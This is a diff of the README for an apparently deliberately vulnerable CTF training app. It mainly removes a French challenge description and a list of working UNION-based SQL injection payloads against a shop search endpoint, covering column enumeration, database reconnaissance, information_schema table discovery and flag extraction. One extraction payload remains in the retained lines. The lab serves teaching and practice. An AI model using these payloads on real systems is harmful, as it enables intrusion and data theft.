@@ -17,22 +17,6 @@ The application accepts JWT tokens with "none" algorithm, allowing attackers to 
 
 The application contains multiple vulnerable endpoints that allow SQL injection attacks:
 
-### Description
-L'application est vulnérable à différents types d'injections SQL.
-
-### Implémentation
-- **Endpoint de recherche vulnérable** : `/api/shop/search` - Recherche de produits avec injection SQL
-- **Interface web** : `/shop.html` - Interface utilisateur pour tester la vulnérabilité
-
-### Emplacement du Flag
-Flag dans une table cachée `ctf_secrets` de la base de données, accessible uniquement via injection SQL.
-
-### Scénario d'Attaque
-1. Identifier le point d'entrée vulnérable dans l'endpoint `/api/shop/search`
-2. Construire une injection SQL appropriée avec UNION SELECT (attention au format LIKE '%input%')
-3. Extraire des données de tables non prévues (exploration via information_schema)
-4. Récupérer le flag dans la table "ctf_secrets"
-
 ## How to Run
 
 ### Using Docker Compose (Recommended)
@@ -159,80 +143,7 @@ Exploit SQL injection vulnerabilities to access the hidden flag in the `ctf_secr
 7. **Extract the flag**
     - Get the flag: `/api/shop/search?name=Laptop' UNION SELECT 999,flag,99.99,description,'FLAG' FROM ctf_secrets WHERE challenge_name='sql_injection'-- `
 
-### Complete Payload List
 
-Here are all the working payloads for copy-paste testing:
-
-#### Basic Tests
-```
-Laptop
-Laptop'
-```
-
-#### Column Enumeration
-```
-Laptop' ORDER BY 1-- 
-Laptop' ORDER BY 2-- 
-Laptop' ORDER BY 3-- 
-Laptop' ORDER BY 4-- 
-Laptop' ORDER BY 5-- 
-Laptop' ORDER BY 6--  
-```
-(The last one should error, confirming 5 columns)
-
-#### UNION SELECT Tests
-```
-Laptop' UNION SELECT 999,'test',99.99,'description','category'-- 
-```
-
-#### Database Reconnaissance
-```
-Laptop' UNION SELECT 999,version(),99.99,'DB Version','info'-- 
-Laptop' UNION SELECT 999,current_database(),99.99,'Current DB','info'-- 
-Laptop' UNION SELECT 999,current_user(),99.99,'Current User','info'-- 
-```
-
-#### Table Discovery
-```
-Laptop' UNION SELECT 999,table_name,99.99,'Table','info' FROM information_schema.tables WHERE table_schema='public'-- 
-```
-
-#### Column Discovery
-```
-Laptop' UNION SELECT 999,column_name,99.99,'Column','info' FROM information_schema.columns WHERE table_name='products'-- 
-Laptop' UNION SELECT 999,column_name,99.99,'Column','info' FROM information_schema.columns WHERE table_name='users'-- 
-Laptop' UNION SELECT 999,column_name,99.99,'Column','info' FROM information_schema.columns WHERE table_name='ctf_secrets'-- 
-```
-
-#### Flag Extraction
-```
-Laptop' UNION SELECT 999,flag,99.99,description,'FLAG' FROM ctf_secrets WHERE challenge_name='sql_injection'-- 
-```
-
-#### Additional Data Extraction
-```
-Laptop' UNION SELECT 999,challenge_name,99.99,flag,'SECRET' FROM ctf_secrets-- 
-```
-
-
-
-### Web Interface
-
-A user-friendly web interface is available at http://localhost:8080/shop.html
-
-This interface provides:
-- **Product search form** with vulnerable endpoint testing
-- **Sample product searches** to test normal functionality
-- **Real-time results** showing both successful queries and error messages
-- **Clean interface** for manual SQL injection testing
-
-The interface allows you to:
-1. Test normal product searches (Laptop, iPhone, Book, Nike)
-2. Manually craft and test SQL injection payloads
-3. See detailed error messages that help with exploitation
-4. Practice SQL injection techniques step by step
-
-**Note:** The detailed payloads are provided in the walkthrough section below for educational purposes.
 
 ## Security Concepts Demonstrated
 
